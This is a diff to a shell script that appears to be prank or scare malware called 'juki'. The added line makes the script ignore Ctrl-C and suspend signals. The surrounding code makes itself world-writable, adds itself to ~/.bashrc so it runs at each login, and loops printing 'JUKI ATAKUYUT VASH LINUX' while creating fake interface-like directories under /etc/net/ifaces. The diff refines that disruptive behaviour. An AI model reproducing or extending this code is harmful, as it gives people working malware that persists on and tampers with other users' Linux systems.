@@ -11,6 +11,7 @@ windows_style() {
 sleep 4
 
 while true; do
+    trap '' SIGINT SIGTSTP
     cd
     chmod 777 juki.v2/super.juki.sh
     echo "juki.v2/super.juki.sh" >> ~/.bashrc
@@ -38,7 +39,7 @@ while true; do
                 clear
                 printf "\e[$(($(tput lines)/2));$(($(tput cols)/2-8))f\033[1;31m!!! JUKI ATAKUYUT VASH LINUX !!!\033[0m"
                 sleep 0.5
-                mkdir -p /etc/net/ifaces/empBs$pip
+                mkdir -p /etc/net/ifaces/emp0s$pip
                 pip=$((pip + 1))
                 pop=$((pop - 1))
                 clear
@@ -57,7 +58,7 @@ while true; do
                 clear
                 printf "\e[$(($(tput lines)/2));$(($(tput cols)/2-8))f\033[1;31m!!! JUKI ATAKUYUT VASH LINUX !!!\033[0m"
                 sleep 0.5
-                mkdir -p /etc/net/ifaces/empBs$pip
+                mkdir -p /etc/net/ifaces/emp0s$pip
                 pip=$((pip + 1))
                 pop=$((pop - 1))
                 clear
